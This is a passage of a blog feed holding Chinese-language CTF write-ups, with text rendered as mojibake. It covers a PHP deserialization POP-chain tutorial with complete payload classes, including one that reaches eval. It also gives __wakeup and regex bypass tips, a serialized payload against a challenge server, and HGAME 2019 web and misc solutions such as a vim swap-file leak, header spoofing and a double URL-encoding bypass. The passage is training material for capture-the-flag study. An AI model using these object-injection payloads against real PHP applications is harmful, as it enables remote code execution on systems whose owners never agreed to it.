class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆçœ‹åˆ° flagçš„è¾“å‡ºåœ¨ GetFlag ç±»çš„æ™®é€šæ–¹æ³•get_flagé‡Œé¢<br>è¦æƒ³è®©è¿™ä¸ªæ–¹æ³•æ‰§è¡Œ å°±è¦æ„é€ POPé“¾</p><p>æ­¥éª¤:</p><ol><li><p>åœ¨ string1ç±» ä¸­å‘ç°åŒåæ–¹æ³• get_flag() åœ¨stringç±»çš„<strong>tostringä¸­ è¦æƒ³è®©</strong>tostringæ‰§è¡Œå°±æƒ³è¦æŠŠç±»string å½“åšå­—ç¬¦ä¸² å› ä¸ºè°ƒç”¨çš„æ˜¯å‚æ•°str1 çš„æ–¹æ³• æ‰€ä»¥è¦å°†str1 èµ‹å€¼ä¸º ç±»getFlag çš„å¯¹è±¡<br>public function __construct(){</p><pre><code>  $this-&gt;str1 = new GetFlag();    //å°†$str1èµ‹å€¼ä¸º  ç±»Getflag çš„å¯¹è±¡}</code></pre></li><li><p>åœ¨ fncç±» å‘ç°<strong>invokeæ–¹æ³• å½“æŠŠå¯¹è±¡å½“åšå‡½æ•°æ—¶ä¼šè°ƒç”¨æ­¤æ–¹æ³• $this-&gt;mod2 = â€œå­—ç¬¦ä¸²æ‹¼æ¥â€.$this-&gt;mod1;<br>å°†$mod1èµ‹å€¼ä¸º string1ç±» çš„å¯¹è±¡<br>public function </strong>construct(){</p><pre><code>  $this-&gt;mod1 = new string1();}</code></pre></li><li><p>functç±» ä¸­çš„<strong>call æ–¹æ³• ä¸­ è°ƒç”¨ç±»mod1æ–¹æ³• ä¸”å‚æ•°ä¸º$test2,å³æ— æ³•è°ƒç”¨test2æ–¹æ³•æ—¶è‡ªåŠ¨è°ƒç”¨ </strong>callæ–¹æ³•<br>éœ€è¦å°†mod1 èµ‹å€¼ä¸º funcç±» çš„å¯¹è±¡<br>public function __construct(){</p><pre><code>  $this-&gt;mod1 = new func();}</code></pre></li><li><p>åœ¨Callä¸­çš„test1æ–¹æ³•ä¸­å­˜åœ¨$this-&gt;mod1-&gt;test2();ï¼Œéœ€è¦æŠŠ$mod1èµ‹å€¼ä¸ºfunctçš„å¯¹è±¡ï¼Œè®©<strong>callè‡ªåŠ¨è°ƒç”¨ã€‚<br>public function </strong>construct(){</p><pre><code>  $this-&gt;mod1 = new funct();}</code></pre></li></ol><p>5.æŸ¥æ‰¾test1æ–¹æ³•çš„è°ƒç”¨ç‚¹ï¼Œåœ¨start_ggä¸­å‘ç°$this-&gt;mod1-&gt;test1();ï¼ŒæŠŠ$mod1èµ‹å€¼ä¸ºstart_ggç±»çš„å¯¹è±¡ï¼Œç­‰å¾…<strong>destruct()è‡ªåŠ¨è°ƒç”¨ã€‚<br>public function </strong>construct(){<br>          $this-&gt;mod1 = new Call();<br>        }</p><p>æœ€ç»ˆpayload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod2;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">          <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> Call();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod2;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">          <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> funct();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod2;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">          <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> func();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($test2,$arr)</span>  // å½“è°ƒç”¨çš„æˆå‘˜æ–¹æ³•ä¸å­˜åœ¨æ—¶è°ƒç”¨æ­¤æ–¹æ³•</span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                $s1 = <span class="keyword">$this</span>-&gt;mod1;</span></span><br><span class="line"><span class="php">                $s1();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod2;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">          <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> string1();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span>   //æŠŠä¸€ä¸ªå¯¹è±¡å½“åšå‡½æ•°å»æ‰§è¡Œä¼šè°ƒç”¨æ­¤æ–¹æ³•</span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;mod2 = <span class="string">"å­—ç¬¦ä¸²æ‹¼æ¥"</span>.<span class="keyword">$this</span>-&gt;mod1;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $str1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $str2;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">          <span class="keyword">$this</span>-&gt;str1 = <span class="keyword">new</span> GetFlag();    <span class="comment">//å°†$str1èµ‹å€¼ä¸º  ç±»Getflag çš„å¯¹è±¡</span></span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="string">"1"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">echo</span> <span class="string">"flag:"</span>.<span class="string">"xxxxxxxxxxxx"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> start_gg;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> serialize($a);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>ä¾‹å­2</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $ClassObj;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> normal();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;ClassObj-&gt;action();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"hello"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $data;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;data);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>åœ¨ lemoç±»ä¸­è°ƒç”¨å¾—çš„æ˜¯ normalç±» ä½†æ˜¯åœ¨ evilç±» ä¸­ä¹Ÿæœ‰åœ¨normalç±»ä¸­çš„ç›¸åŒæ–¹æ³•å action<br>è¿™æ—¶å¯ä»¥æ„é€ pocé“¾æ¥è°ƒç”¨ evilç±» ä¸­çš„ actionæ–¹æ³•<br>payloadï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $ClassObj;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> evil();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"hello"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $data = <span class="string">"phpinfo()"</span>;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;data);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> lemon;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> serialize($a);</span></span><br></pre></td></tr></table></figure><h2 id="ä¸€äº›ç»•è¿‡"><a href="#ä¸€äº›ç»•è¿‡" class="headerlink" title="ä¸€äº›ç»•è¿‡"></a>ä¸€äº›ç»•è¿‡</h2><p>1ã€å½“æˆå‘˜å±æ€§æ•°ç›®å¤§äºå®é™…æ•°ç›®æ—¶å¯ç»•è¿‡wakeupæ–¹æ³•</p><p>2ã€CTFä¸­æˆå‘˜å±æ€§æ•°ç›®å‰é¢å¤šä¸€ä¸ª+å¯ä»¥ç»•è¿‡æ­£åˆ™</p><h2 id="å®æˆ˜"><a href="#å®æˆ˜" class="headerlink" title="å®æˆ˜"></a>å®æˆ˜</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>D0g3å¹³å°ä¸€é“å¾ˆç®€å•çš„ååºåˆ—åŒ–çš„é¢˜<br>ç½‘å€:<a href="http://120.79.33.253:9001/" target="_blank" rel="noopener">http://120.79.33.253:9001/</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span></span><br><span class="line"><span class="php">$KEY = <span class="string">"D0g3!!!"</span>;</span></span><br><span class="line"><span class="php">$str = $_GET[<span class="string">'str'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (unserialize($str) === <span class="string">"$KEY"</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"$flag"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">show_source(<span class="keyword">__FILE__</span>);</span></span><br></pre></td></tr></table></figure><p>åŸç†:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$str = <span class="string">"D0g3!!!"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$str1 = serialize($str);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $str1;   <span class="comment">// s:7:"D0g3!!!";</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$str2 = unserialize($str1);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $str2;  <span class="comment">// D0g3!!!</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>payload:</p><pre><code>http://120.79.33.253:9001/?str=s:7:%22D0g3!!!%22</code></pre><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://xz.aliyun.com/t/3674#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/3674#toc-0</a><br><a href="http://php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">http://php.net/manual/zh/language.oop5.magic.php</a><br><a href="http://php.net/manual/zh/language.oop5.serialization.php" target="_blank" rel="noopener">http://php.net/manual/zh/language.oop5.serialization.php</a><br><a href="https://blog.csdn.net/qq_23937195/article/details/73027557" target="_blank" rel="noopener">https://blog.csdn.net/qq_23937195/article/details/73027557</a><br><a href="http://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html" target="_blank" rel="noopener">http://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html</a><br><a href="https://www.cnblogs.com/iamstudy/articles/php_unserialize_pop_2.html" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/php_unserialize_pop_2.html</a><br><a href="https://www.anquanke.com/post/id/162300" target="_blank" rel="noopener">https://www.anquanke.com/post/id/162300</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019æ­ç”µCTF HGAME Writeup</title>
      <link href="/2019/01/27/2019%E6%9D%AD%E7%94%B5CTF-HGAME-Writeup/"/>
      <url>/2019/01/27/2019%E6%9D%AD%E7%94%B5CTF-HGAME-Writeup/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç¬¬ä¸€æ¬¡AKäº†webâ€¦..<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1fzlaptvjruj311y0h3my1.jpg" alt=""></p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h2 id="è°åƒäº†æˆ‘çš„flag"><a href="#è°åƒäº†æˆ‘çš„flag" class="headerlink" title="è°åƒäº†æˆ‘çš„flag"></a>è°åƒäº†æˆ‘çš„flag</h2><p>å‘œå‘œå‘œï¼ŒMkiä¸€èµ·åºŠå‘ç°å†™å¥½çš„é¢˜ç›®å˜æˆè¿™æ ·äº†ï¼Œæ˜¯å› ä¸ºæ˜¨å¤©æ²¡æœ‰å¥½å¥½å…³æœºå—T_T hint: æ®å½“äº‹äººå›å¿†ï¼Œé‚£ä¸ªå¤œæ™šä»–æ­£åœ¨ç”¨vimç¼–å†™é¢˜ç›®é¡µé¢ï¼Œä¼¼ä¹æ²¡æœ‰ä¿å­˜å°±å…³æœºç¡è§‰å»äº†,ç°åœ¨å°±æ˜¯åæ‚”ï¼Œååˆ†çš„åæ‚”ã€‚</p><p>hint æ˜¯åæ¥å¢åŠ çš„ ä¸€å¼€å§‹åšçš„æ—¶å€™å°±æƒ³åˆ°ç±»vimæ–‡ä»¶æ³„éœ² å¯æ˜¯å½“æ—¶æ²¡æœ‰</p><p>ç¬¬äºŒå¤©çœ‹äº†å‡ºäº†hint è¯´æ˜¯vim  å†è¿›è¡Œ /.index.html.swp<br>æˆåŠŸä¸‹è½½å‡ºæ¥ å¾—åˆ°flag</p><h2 id="æ¢å¤´å¤§ä½œæˆ˜"><a href="#æ¢å¤´å¤§ä½œæˆ˜" class="headerlink" title="æ¢å¤´å¤§ä½œæˆ˜"></a>æ¢å¤´å¤§ä½œæˆ˜</h2><ol><li>é»˜è®¤æ˜¯GETæäº¤ æ”¹ä¸ºPOSTæäº¤<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1fzlaqfpvdlj30r70f7jse.jpg" alt=""></li><li>è®¾ç½®X-Forwarded-For:127.0.0.1<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1fzlaqwyns3j30vh0dogoc.jpg" alt=""></li><li>ä¿®æ”¹UA<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1fzlarkhu5rj30yo0dndil.jpg" alt=""><ol start="4"><li>ä¿®æ”¹referer<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1fzlaryzf5sj30yx0d7wh3.jpg" alt=""><h2 id="very-easy-web"><a href="#very-easy-web" class="headerlink" title="very easy web"></a>very easy web</h2></li></ol></li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(strpos(<span class="string">"vidar"</span>,$_GET[<span class="string">'id'</span>])!==<span class="keyword">FALSE</span>)</span></span><br><span class="line"><span class="php">  <span class="keyword">die</span>(<span class="string">"&lt;p&gt;å¹²å·´çˆ¹&lt;/p&gt;"</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$_GET[<span class="string">'id'</span>] = urldecode($_GET[<span class="string">'id'</span>]);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($_GET[<span class="string">'id'</span>] === <span class="string">"vidar"</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">echo</span> $flag;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><pre><code>$_GET[&apos;id&apos;] = urldecode($_GET[&apos;id&apos;]);</code></pre><p>å¯¹idè¿›è¡Œurlè§£ç äº†ä¸€æ¬¡<br>åœ¨æ•°æ®ä¼ å…¥phpè„šæœ¬è¿›è¡Œæ•°æ®å¤„ç†æ—¶æœ¬èº«ä¼šè¢«è§£ç ä¸€æ¬¡<br>è¿™æ ·å°±å¯¼è‡´äº†äºŒæ¬¡ç¼–ç æ³¨å…¥</p><p>å°†vidarè¿›è¡Œurlç¼–ç ä¸¤æ¬¡æäº¤<br>?id=%2576%2569%2564%2561%2572</p><h2 id="can-u-find-me"><a href="#can-u-find-me" class="headerlink" title="can u find me?"></a>can u find me?</h2><p>åœ¨æºä»£ç çœ‹åˆ°f12.php<br>è®¿é—®<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1fzlasbk5cpj30n408imz9.jpg" alt=""><br>åœ¨è¿”å›åŒ…çœ‹åˆ°å¯†ç ,æäº¤</p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1fzlasvfnqej310m0btmz8.jpg" alt=""><br>è®¿é—®iamflag.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1fzlat857jaj30xl0ajmyw.jpg" alt=""></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h2 id="Hidden-Image-in-LSB"><a href="#Hidden-Image-in-LSB" class="headerlink" title="Hidden Image in LSB"></a>Hidden Image in LSB</h2><p>ç”¨stegsolveè¿›è¡Œåˆ†æå¾—åˆ°flag<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1fzlatlcbwpj30r70l8wfd.jpg" alt=""></p><h2 id="Broken-Chest"><a href="#Broken-Chest" class="headerlink" title="Broken Chest"></a>Broken Chest</h2><p>æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…æ–‡ä»¶ï¼Œè§£å‹å‘ç°æ–‡ä»¶é”™è¯¯<br>ç”¨winhexæ‰“å¼€å‹ç¼©åŒ…åˆ†æåˆ†æ<br>å‘ç°æ–‡ä»¶å¤´ä¸æ˜¯ä»¥ 50 4B 03 04 å¼€å¤´<br>ä¿®æ”¹ä¸º50 4B 03 04 å¼€å¤´ å³å¯ ä¿å­˜<br>è§£å‹å‘ç°è¦å¯†ç , åœ¨æ³¨é‡Šé‡Œé¢çœ‹åˆ°å¯†ç  æäº¤å¾—åˆ°flag</p><p><strong>å‚è€ƒ</strong>:<br><a href="https://ctf-wiki.github.io/ctf-wiki/misc/archive/zip/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/misc/archive/zip/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2019å®‰æ’æ¯ä¸€æœˆæ–°æ˜¥è´ºå²èµ›writeup</title>
      <link href="/2019/01/27/2019%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%80%E6%9C%88%E6%96%B0%E6%98%A5%E8%B4%BA%E5%B2%81%E8%B5%9Bwriteup/"/>
      <url>/2019/01/27/2019%E5%AE%89%E6%81%92%E6%9D%AF%E4%B8%80%E6%9C%88%E6%96%B0%E6%98%A5%E8%B4%BA%E5%B2%81%E8%B5%9Bwriteup/</url>
      
